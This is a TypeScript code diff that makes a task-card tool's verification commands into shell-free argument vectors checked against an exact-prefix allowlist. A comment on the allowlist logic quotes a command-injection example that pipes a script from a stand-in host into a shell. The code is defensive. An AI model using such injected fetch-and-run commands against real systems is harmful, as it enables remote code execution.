@@ -1,8 +1,11 @@
 import {
+    ARGV_CONTROL_CHARACTER_RE,
     CARD_EFFORTS,
     CARD_PRIORITIES,
     CARD_STATUSES,
-    CARD_TYPES
+    CARD_TYPES,
+    VERIFICATION_POLICY_DEFAULT_AREA,
+    VERIFY_TIMEOUT_SECONDS_DEFAULT
 } from "../../config/defaults.js";
 import { ValidationError } from "../../core/errors.js";
 import {
@@ -75,6 +78,57 @@ export function declaredAxes(workspace): Array<[string, string[]]> {
 
 export function axisNames(workspace): string[] {
     return declaredAxes(workspace).map(([name]) => name);
+}
+
+/**
+ * The methods this project accepts for `area`, or `null` when it declares no
+ * policy that covers it.
+ *
+ * `null` rather than the full vocabulary, and that distinction is the whole of
+ * the default. A project with no opinion has to give the gate *nothing to
+ * check* — not a list that happens to contain everything — because those two
+ * are the same verdict today and stop being the same the moment a fourth method
+ * exists. It is also what lets `workfile schema` report an empty map honestly
+ * instead of a policy nobody wrote.
+ *
+ * `Object.hasOwn` rather than a bare index, so an area called `toString` or
+ * `constructor` falls through to `*` instead of picking up a prototype member.
+ */
+export function acceptedVerificationMethods(workspace, area: string): string[] | null {
+    const declared = workspace?.config?.cards?.verification?.methods;
+    if (!declared || typeof declared !== "object") return null;
+    const own = (key: string) =>
+        Object.hasOwn(declared, key) ? declared[key] : undefined;
+    const accepted = own(area) ?? own(VERIFICATION_POLICY_DEFAULT_AREA);
+    return Array.isArray(accepted) && accepted.length ? [...accepted] : null;
+}
+
+/**
+ * The accepted list when `method` is refused for `area`, and `null` when it
+ * passes.
+ *
+ * One function rather than a boolean predicate because both callers need the
+ * verdict *and* the list to name in the message, and a predicate would send
+ * each of them back for a second, separately-nullable lookup.
+ *
+ * `forced` is never judged. It is not a method a caller chose, it is the record
+ * saying that a gate was walked past and a reason was written down — so putting
+ * it in front of a policy would be asking whether the project accepts being
+ * forced, which is a question `--force` has already answered on the trail. An
+ * absent method is not judged either, and cannot arise from a close: T-0186
+ * resolves every write into `done` to `local` when the caller names nothing.
+ * What reaches here without a method is a card closed before the block existed,
+ * and that card asserts nothing to check.
+ */
+export function verificationRefusal(
+    workspace,
+    area: string,
+    method: unknown
+): string[] | null {
+    if (!method || method === "forced") return null;
+    const accepted = acceptedVerificationMethods(workspace, area);
+    if (!accepted || accepted.includes(String(method))) return null;
+    return accepted;
 }
 
 /**
@@ -160,6 +214,115 @@ const VERIFY_KEYS = ["id", "run", "criteria"];
 const VERIFY_ID = /^[a-z0-9][a-z0-9-]*$/;
 
 /**
+ * A card's `run` is an argument vector, and it is spawned without a shell.
+ *
+ * This is the decision the allowlist rests on, so it is worth stating where the
+ * check lives. Over a shell string no prefix matcher can be sound: `pnpm test`
+ * is a prefix of `pnpm test; curl evil.sh | sh`, and of every backtick, `&&`
+ * and newline variant of the same trick. The matcher would be deciding what a
+ * shell it never runs is going to do with the rest of the line, which is a
+ * question with no honest answer.
+ *
+ * As `["pnpm", "test"]` handed to `spawn(file, args, { shell: false })` the
+ * question disappears rather than being answered: the array the matcher
+ * compares is the argument vector the operating system receives, with no parse
+ * in between, and metacharacters are bytes inside one argument. Prefix matching
+ * is then element-wise string equality, which is decidable.
+ *
+ * The cost is that `run` cannot be written the way ADR-0016 draws it. That is
+ * the right trade and the decision record needs the amendment; a shape that
+ * reads like shell but is not one would be worse than either.
+ */
+export function argvElements(run: unknown): string[] | null {
+    if (!Array.isArray(run) || run.length === 0) return null;
+    return run.every(
+        (part) =>
+            typeof part === "string" &&
+            part !== "" &&
+            !ARGV_CONTROL_CHARACTER_RE.test(part)
+    )
+        ? (run as string[])
+        : null;
+}
+
+/** An argv rendered for a human to read in an error or a doctor line. */
+export function formatCommand(argv: readonly string[]): string {
+    return argv.join(" ");
+}
+
+/**
+ * The argv prefixes this project permits, or an empty list when it declares
+ * none.
+ *
+ * Read through here rather than off the config so the empty default is one
+ * expression rather than a `|| []` at every call site — and so "declares
+ * nothing" and "declares an empty list" cannot diverge, since they mean the
+ * same thing and both have to refuse everything.
+ */
+export function allowedCommands(workspace): string[][] {
+    const declared = workspace?.config?.cards?.verification?.commands;
+    return Array.isArray(declared) ? (declared as string[][]) : [];
+}
+
+/**
+ * How long a declared command may run here, in seconds.
+ *
+ * Same reason `allowedCommands` is a function: the fallback is a rule, and a
+ * rule written at two call sites is a rule that will eventually differ between
+ * them. A declared value has already passed config validation, so anything that
+ * is not a usable number here came from a workspace object somebody built by
+ * hand — `card verify` still has to have a number, so it takes the default
+ * rather than dividing by `NaN`.
+ */
+export function verifyTimeoutSeconds(workspace): number {
+    const declared = workspace?.config?.cards?.verification?.timeoutSeconds;
+    return typeof declared === "number" && Number.isFinite(declared) && declared > 0
+        ? declared
+        : VERIFY_TIMEOUT_SECONDS_DEFAULT;
+}
+
+/**
+ * Whether `argv` starts with one of the declared prefixes.
+ *
+ * Element-wise `===` and nothing else. It must not lower-case, trim, resolve a
+ * path, strip quotes, `normalize()` the Unicode or join the vector into a
+ * string and search it — every one of those opens a gap between the command
+ * that was matched and the command that will run, which is the only thing this
+ * function exists to close. A homoglyph or a stray space therefore does not
+ * match, and does not need a character rule to be refused: it is simply not the
+ * command the project declared.
+ */
+export function commandAllowed(allowed: string[][], argv: readonly string[]): boolean {
+    return allowed.some(
+        (prefix) =>
+            prefix.length > 0 &&
+            prefix.length <= argv.length &&
+            prefix.every((part, index) => part === argv[index])
+    );
+}
+
+/**
+ * The refusal, phrased for both halves of "empty by default".
+ *
+ * One code with a branching message, following `CARD_AXIS_UNKNOWN` above: a
+ * caller switching on the code wants one branch, and a human reading it wants
+ * two different remedies — declare the command, or declare the first one this
+ * project has.
+ */
+export function commandNotAllowedMessage(
+    id: string,
+    argv: readonly string[],
+    allowed: string[][]
+): string {
+    return (
+        `Verify entry ${id} runs \`${formatCommand(argv)}\`, which this project does not permit. ` +
+        (allowed.length
+            ? `Declared: ${allowed.map((prefix) => `\`${formatCommand(prefix)}\``).join(", ")}.`
+            : "This project declares none; add cards.verification.commands to its config.")
+    );
+}
+
+/**
  * The `verify` block, checked before it can land.
  *
  * Refused at write time rather than reported later because every one of these
@@ -172,10 +335,21 @@ const VERIFY_ID = /^[a-z0-9][a-z0-9-]*$/;
  * The exception is a criterion edited *after* the binding was written. That
  * goes through the body, which this never sees, and it is `doctor`'s to report
  * — the digest exists to make exactly that visible rather than to prevent it.
+ *
+ * The allowlist is checked here for the same reason as the rest: a command the
+ * project does not permit is a card the runner will not act on, so it should
+ * never land. It checks the whole candidate rather than only what the write
+ * changed, which means a card that already carries a disallowed command is
+ * refused every mutation until the block is cleared — `card patch ID
+ * --json-input -` with `{"verify": null}` is the way out, and the same is
+ * already true of a duplicate entry id. What that gate cannot see is a card
+ * that arrived as a file in somebody's diff and never called a mutation at all,
+ * which is why `diagnoseCards` runs the identical check on read.
  */
-function validateVerify(candidate) {
+function validateVerify(workspace, candidate) {
     const verify = candidate.verify;
     if (verify == null || verify === "") return;
+    const allowed = allowedCommands(workspace);
     if (!Array.isArray(verify)) {
         fail("CARD_VERIFY_INVALID", "verify must be a list of entries.");
     }
@@ -212,11 +386,29 @@ function validateVerify(candidate) {
             );
         }
         seen.add(entry.id);
-        if (!String(entry.run || "").trim()) {
+        if (entry.run == null || (Array.isArray(entry.run) && !entry.run.length)) {
             fail(
                 "CARD_VERIFY_RUN_REQUIRED",
                 `Verify entry ${entry.id} declares no command to run.`,
                 { id: entry.id }
+            );
+        }
+        const argv = argvElements(entry.run);
+        if (!argv) {
+            fail(
+                "CARD_VERIFY_RUN_INVALID",
+                `Verify entry ${entry.id} must write run as an argument vector — ` +
+                    `run: [pnpm, test] — of non-empty strings holding no control ` +
+                    `characters. It is spawned without a shell, so a single string ` +
+                    `would have to be parsed by something, and nothing here parses it.`,
+                { id: entry.id, run: entry.run ?? null }
+            );
+        }
+        if (!commandAllowed(allowed, argv)) {
+            fail(
+                "CARD_VERIFY_COMMAND_NOT_ALLOWED",
+                commandNotAllowedMessage(entry.id, argv, allowed),
+                { id: entry.id, run: argv, declared: allowed }
             );
         }
         const criteria = entry.criteria == null ? [] : entry.criteria;
@@ -367,7 +559,7 @@ export function validateCardCandidate(workspace, candidate, cards, currentId = n
     if (hasActor && candidate.status !== "doing") {
         fail("CARD_CLAIM_STATUS_INVALID", "Claimed cards must have status doing.");
     }
-    validateVerify(candidate);
+    validateVerify(workspace, candidate);
     return candidate;
 }
 
